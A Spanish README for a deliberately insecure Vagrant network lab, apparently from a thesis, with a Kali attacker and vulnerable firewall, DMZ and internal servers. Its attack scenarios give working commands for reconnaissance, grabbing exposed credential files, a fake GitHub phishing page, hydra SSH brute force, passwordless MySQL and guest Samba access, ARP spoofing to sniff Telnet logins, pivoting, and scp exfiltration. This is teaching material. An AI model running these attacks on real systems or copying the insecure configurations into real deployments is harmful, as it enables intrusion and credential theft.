## Bloque 4 — Insecure Network Lab

---

Infraestructura de red intencionadamente insegura para demostrar ataques reales sobre configuraciones incorrectas comunes en entornos corporativos. Debe usarse exclusivamente en este entorno aislado.

## Índice
1.[Descripción]

2.[Topología]

3.[Máquinas virtuales]

4.[Malas prácticas documentadas]

5.[Requisitos]

6.[Despliegue]

7.[Escenarios de ataque]

8.[Advertencia legal]

Descripción
Este bloque simula una red corporativa con errores de configuración reales y frecuentes. El objetivo es poder reproducir y comprender los ataques descritos en el capítulo 7 de la memoria, observando en un entorno controlado las consecuencias de cada mala práctica.

El laboratorio se compone de cuatro máquinas virtuales orquestadas con Vagrant sobre VirtualBox. Todas las redes son internas (intnet) y no tienen salida real a internet durante las prácticas — la interfaz NAT de Vagrant solo se usa durante el aprovisionamiento inicial.

Redes definidas:

net-externa (100.70.9.0/24): Red del atacante

net-dmz (192.168.57.0/24): Zona desmilitarizada expuesta

net-interna (192.168.58.0/24): Red corporativa con datos sensibles

Topología
Pendiente de hacer.

Máquinas virtuales
VM	Box	IP	Red	RAM	Rol
external-kali	kalilinux/rolling	100.70.9.10	net-externa	1024 MB	Atacante externo
firewall	ubuntu/jammy64	100.70.9.1 / 192.168.57.1 / 192.168.58.1	Todas	512 MB	Firewall vulnerable
dmz-server	ubuntu/jammy64	192.168.57.10	net-dmz	512 MB	Apache + FTP + Telnet
internal-server	ubuntu/jammy64	192.168.58.10	net-interna	2048 MB	MySQL + Samba + SSH
Malas prácticas documentadas
Firewall (firewall)
Política FORWARD DROP por defecto pero con reglas explícitas que permiten todo el tráfico entre cualquier segmento

ip_forward habilitado sin restricción de rutas

Sin inspección de estado ni filtrado por protocolo

Reglas que permiten tráfico externo → DMZ, externo → interno y DMZ → interno sin limitación de puertos

Sin logging de tráfico — los ataques no dejan rastro en logs

rp_filter desactivado — permite suplantación de IP de origen

accept_source_route y accept_redirects habilitados

Sin NAT — las IPs originales son visibles en todos los segmentos

DMZ (dmz-server)
Apache con ServerTokens Full y ServerSignature On — expone versión exacta en cabeceras HTTP

Directory listing habilitado en /var/www/html

phpinfo() accesible públicamente en /info.php

Panel de administración en /admin/ sin autenticación — muestra credenciales en texto plano

Directorio /backup/ con ficheros credentials.txt y network.txt descargables vía HTTP

Sitio de phishing en http://192.168.57.10:8080 que captura credenciales

FTP anónimo habilitado con permisos de escritura (vsftpd)

Telnet activo en puerto 23 — credenciales transmitidas en texto claro

Usuario ftpoperator:ftpoperator con acceso SSH y Telnet

Sin firewall local (ufw desactivado)

Rutas estáticas que permiten acceso directo a internal-server desde la DMZ

Servidor interno (internal-server)
SSH con PermitRootLogin yes, PasswordAuthentication yes y sin límite de intentos

Contraseña root:root para acceso root por SSH

Banner SSH que revela versión del sistema operativo

MySQL con usuario root sin contraseña y bind-address 0.0.0.0

Base de datos corporativedb con credenciales en texto plano en tabla user_credentials

Tabla network_inventory con listado completo de IPs y servicios de la infraestructura

Samba con recurso confidential accesible como invitado sin autenticación

Fichero /srv/samba/confidential/passwords.txt con todas las credenciales corporativas

Sin firewall local — todos los puertos accesibles desde cualquier segmento

Rutas estáticas hacia DMZ y red externa

Requisitos
VirtualBox >= 7.0

Vagrant >= 2.4

Espacio en disco: ~15 GB (boxes + VMs)

RAM disponible: mínimo 3 GB (recomendado 8 GB)

Conexión a internet: solo durante el primer vagrant up (descarga de boxes)

Instalación en Ubuntu Server 24.04
bash
# VirtualBox
sudo apt install -y virtualbox virtualbox-ext-pack

# Vagrant
wget -O- https://apt.releases.hashicorp.com/gpg | \
  sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] \
  https://apt.releases.hashicorp.com $(lsb_release -cs) main" | \
  sudo tee /etc/apt/sources.list.d/hashicorp.list
sudo apt update && sudo apt install -y vagrant
Despliegue
bash
# Clonar el repositorio y entrar al bloque
cd 4-insecure-network-lab/

# Levantar todas las VMs (primera vez: descarga boxes ~4 GB)
vagrant up

# Levantar solo una VM específica
vagrant up external-kali

# Acceder a una VM
vagrant ssh external-kali
vagrant ssh internal-server

# Ver estado de las VMs
vagrant status

# Detener sin destruir (mantiene configuración)
vagrant halt

# Destruir todo el laboratorio
vagrant destroy -f
Tiempos estimados:

Primera ejecución: 20-50 minutos (descarga de boxes + aprovisionamiento)

Ejecuciones posteriores: 3-10 minutos (boxes en caché)

Reinicio de VMs (vagrant halt + vagrant up): 2-5 minutos

Nota: Las VMs están configuradas con box_check_update = false para evitar comprobaciones de nuevas versiones durante las prácticas.

Escenarios de ataque
Todos los ataques se ejecutan desde external-kali. Para acceder:

bash
vagrant ssh external-kali
Los alias predefinidos en Kali (nmap-quick, nmap-full, targets) facilitan los comandos durante las prácticas.

1. Reconocimiento de red
El primer paso de cualquier ataque es identificar qué máquinas existen y qué servicios exponen. Como el firewall no filtra sondas de reconocimiento, nmap obtiene información completa de versiones y puertos en todos los segmentos.

bash
# Escaneo rápido de servicios en la DMZ
nmap 192.168.57.10

# Escaneo completo del servidor interno (directo, sin pasar por DMZ)
nmap -sV -sC -O -p- -T4 192.168.58.10

# Enumeración SMB del servidor interno:
# revela shares, usuarios y políticas de contraseñas sin credenciales
enum4linux 192.168.58.10
Qué demuestra: sin reglas que limiten ICMP ni sondas TCP, un atacante externo obtiene en segundos el mapa completo de la infraestructura interna, incluyendo versiones exactas de software que pueden tener CVEs conocidos. La regla FORWARD que permite externo → interno convierte al firewall en un router sin filtro.

Para descubrimiento ARP una vez dentro de la DMZ:

bash
# Desde external-kali accedemos a dmz-server por Telnet
telnet 192.168.57.10
# Usuario: ftpoperator / Contraseña: ftpoperator

# Ya dentro de dmz-server, escaneamos la red interna
netdiscover -i enp0s8 -r 192.168.58.0/24
2. Acceso a la DMZ
La DMZ expone múltiples servicios sin protección. Un atacante externo puede obtener información sensible sin necesidad de explotar vulnerabilidades.

2.1 Exfiltración de información vía HTTP
Apache tiene directory listing habilitado y expone directorios con ficheros sensibles descargables sin autenticación.

bash
# Descargar credenciales corporativas expuestas en /backup/
curl http://192.168.57.10/backup/credentials.txt

# Ver el mapa de red interno
curl http://192.168.57.10/backup/network.txt

# Ver información completa del servidor PHP (versión, módulos,
# variables de entorno, rutas del sistema, kernel...)
curl http://192.168.57.10/info.php

# Acceder al panel de administración sin autenticación
# que muestra credenciales de la base de datos corporativa
curl http://192.168.57.10/admin/
Qué demuestra: ServerTokens Full + directory listing permite a un atacante obtener credenciales reales y el mapa de red interna sin explotar ninguna vulnerabilidad, solo navegando por la web.

2.2 FTP anónimo
vsftpd está configurado con anonymous_enable=YES, no_anon_password=YES y permisos de escritura, permitiendo acceso completo sin credenciales.

bash
ftp 192.168.57.10
# Usuario: anonymous (o ftp)
# Contraseña: (vacío, solo pulsar Enter)

ftp> ls
ftp> cd public
ftp> get readme.txt
ftp> get config_backup.txt
ftp> exit
Qué demuestra: el fichero config_backup.txt contiene credenciales de base de datos en texto plano (DB_USER=root, DB_PASS= vacío) y la IP del servidor MySQL interno. Un atacante obtiene acceso a la base de datos corporativa sin haber comprometido ningún sistema todavía.

2.3 Telnet — credenciales en texto claro
Telnet transmite todo sin cifrar. Las credenciales viajan en texto plano por la red.

bash
telnet 192.168.57.10
# Login: ftpoperator
# Password: ftpoperator
Qué demuestra: cualquier atacante posicionado como MITM en el segmento (ver escenario 4) captura usuario y contraseña en texto plano. SSH cifra esta misma información — Telnet no.

2.4 Sitio de phishing corporativo
El servidor DMZ aloja una página de inicio de sesión falsa de GitHub en el puerto 8080. Las credenciales introducidas se almacenan en /var/log/phishing.log.

bash
# Acceder al sitio de phishing desde Kali
curl http://192.168.57.10:8080

# Simular envío de credenciales
curl -X POST http://192.168.57.10:8080/capture.php \
  -d "username=admin&password=Password123!"

# Recoger credenciales capturadas accediendo al DMZ
ssh ftpoperator@192.168.57.10
cat /var/log/phishing.log
Qué demuestra: un atacante que compromete la DMZ puede desplegar un sitio de phishing para capturar credenciales de usuarios internos. La falta de segmentación permite que el sitio sea accesible desde la red interna.

3. Acceso a la red interna
El firewall permite tráfico directo desde la red externa a la red interna sin restricciones, exponiendo servicios críticos.

3.1 Fuerza bruta SSH
El servidor interno tiene SSH con PermitRootLogin yes, PasswordAuthentication yes y sin límite de intentos efectivo. Hydra automatiza la fuerza bruta.

bash
# Fuerza bruta con credenciales conocidas (diccionario mínimo)
hydra -l root -p root ssh://192.168.58.10

# Acceso root directo
ssh root@192.168.58.10
# Password: root
Qué demuestra: la combinación de credenciales débiles + SSH expuesto sin protección + firewall permisivo permite acceso root completo al servidor interno en segundos. En el Bloque 3, fail2ban bloquearía la IP tras el primer intento fallido.

3.2 Acceso MySQL sin contraseña
MySQL está configurado con bind-address = 0.0.0.0 y el usuario root sin contraseña, aceptando conexiones desde cualquier IP.

Acceso directo desde external-kali (sin pivotar):

bash
# El firewall permite tráfico externo → interno en el puerto 3306
mysql -h 192.168.58.10 -u root

mysql> USE corporativedb;
mysql> SELECT * FROM user_credentials;
mysql> SELECT * FROM network_inventory;
mysql> SELECT * FROM employees;
mysql> exit
Acceso por pivoting desde dmz-server:

bash
# Paso 1: acceder a dmz-server por Telnet o SSH
telnet 192.168.57.10          # usuario: ftpoperator / ftpoperator

# Paso 2: desde dmz-server, conectar a MySQL en la red interna
# La DMZ no está aislada: el firewall permite DMZ → interna sin filtro
mysql -h 192.168.58.10 -u root

mysql> USE corporativedb;
mysql> SELECT * FROM user_credentials;
Qué demuestra: dos vectores distintos llegan al mismo resultado. El acceso directo desde el exterior demuestra que el firewall no segmenta realmente las redes. El pivoting demuestra que comprometer un servidor de DMZ equivale a comprometer la red interna completa.

3.3 Recurso Samba anónimo
El share confidential tiene guest ok = yes y guest only = yes, accesible sin credenciales.

Desde external-kali directamente:

bash
smbclient //192.168.58.10/confidential -N
smb: \> ls
smb: \> get passwords.txt
smb: \> exit

# Ver el contenido del fichero descargado
cat passwords.txt
Desde dmz-server (tras pivotar):

bash
# Desde la sesión Telnet/SSH en dmz-server
smbclient //192.168.58.10/confidential -N
smb: \> get passwords.txt
smb: \> exit
Qué demuestra: el fichero passwords.txt contiene credenciales de todos los servicios en texto plano (admin/admin123, root/root, ftpoperator/ftpoperator). Un atacante que solo llegue a Samba ya tiene acceso completo a toda la infraestructura sin necesidad de explotar nada más.

4. ARP Spoofing y captura de tráfico
El ARP Spoofing se ejecuta desde external-kali posicionándose entre dmz-server y el firewall para interceptar todo su tráfico. Como no hay DHCP snooping ni ARP inspection, el ataque es inmediato e indetectable.

bash
# Paso 1: habilitar ip_forward en Kali para que el tráfico
# interceptado siga fluyendo y no se corte la comunicación
sudo sysctl -w net.ipv4.ip_forward=1

# Paso 2: enviar ARP replies falsos en ambas direcciones
# Kali le dice a dmz-server que la MAC del firewall es la suya
# Kali le dice al firewall que la MAC de dmz-server es la suya
sudo arpspoof -i eth1 -t 192.168.57.10 192.168.57.1 &
sudo arpspoof -i eth1 -t 192.168.57.1 192.168.57.10 &

# Paso 3: capturar el tráfico Telnet en texto claro
sudo tcpdump -i eth1 -A -s0 port 23
Mientras tcpdump está activo, abrir otra terminal y conectarse por Telnet a dmz-server:

bash
# En otra terminal de external-kali
telnet 192.168.57.10
# Usuario: ftpoperator / Contraseña: ftpoperator
Las credenciales aparecerán en texto plano en la captura de tcpdump.

bash
# Para detener el ARP spoofing al terminar
sudo killall arpspoof tcpdump
sudo sysctl -w net.ipv4.ip_forward=0
Qué demuestra: Telnet y FTP transmiten credenciales sin cifrar. En el Bloque 3 estos protocolos están eliminados y reemplazados por SSH/SFTP. La ausencia de ARP inspection hace el ataque trivial en cualquier red plana.

5. Pivoting DMZ → red interna
Este escenario resume la cadena de ataque completa y demuestra por qué la DMZ debe estar aislada de la red interna.

bash
# Paso 1: desde external-kali, acceder a dmz-server
# usando credenciales obtenidas en el escenario 2
ssh ftpoperator@192.168.57.10   # password: ftpoperator

# Paso 2: desde dmz-server, acceder a todos los servicios
# de la red interna directamente — el firewall no lo impide
mysql -h 192.168.58.10 -u root
# Mostrar credenciales corporativas
mysql> SELECT * FROM corporativedb.user_credentials;

# Acceder al recurso Samba anónimo
smbclient //192.168.58.10/confidential -N
smb: \> get passwords.txt
smb: \> exit

# Paso 3: con credenciales obtenidas, acceso SSH completo
ssh root@192.168.58.10   # password: root
Qué demuestra: comprometer un servidor de DMZ debería ser un incidente contenido. En este laboratorio, equivale a comprometer toda la red interna porque no existe aislamiento real entre segmentos. En el Bloque 3, reglas de firewall explícitas impiden cualquier conexión iniciada desde la DMZ hacia la red interna.

6. Exfiltración de datos desde la red interna
Una vez obtenido acceso root al servidor interno, el atacante puede exfiltrar toda la información corporativa.

bash
# Desde internal-server como root
# Exportar base de datos completa
mysqldump -u root corporativedb > /tmp/corporativedb.sql

# Copiar ficheros de Samba
tar -czf /tmp/confidential.tar.gz /srv/samba/confidential/

# Enviar datos al atacante (Kali)
scp /tmp/corporativedb.sql vagrant@192.168.57.10:/home/vagrant/lab/captures/
scp /tmp/confidential.tar.gz vagrant@192.168.57.10:/home/vagrant/lab/captures/
Qué demuestra: la falta de segmentación y de monitorización permite a un atacante extraer toda la información corporativa sin ser detectado. La ausencia de logging en el firewall hace imposible rastrear la exfiltración.

Advertencia legal
Este laboratorio contiene configuraciones deliberadamente inseguras. Debe ejecutarse exclusivamente en el entorno aislado descrito en esta documentación.

Todas las credenciales, nombres, correos y datos son ficticios

Las IPs usadas no deben solaparse con redes reales

No desplegar en entornos de producción ni conectarlo a redes corporativas

El laboratorio está diseñado para no tener acceso a internet durante las prácticas

Uso exclusivo para fines educativos en entornos controlados.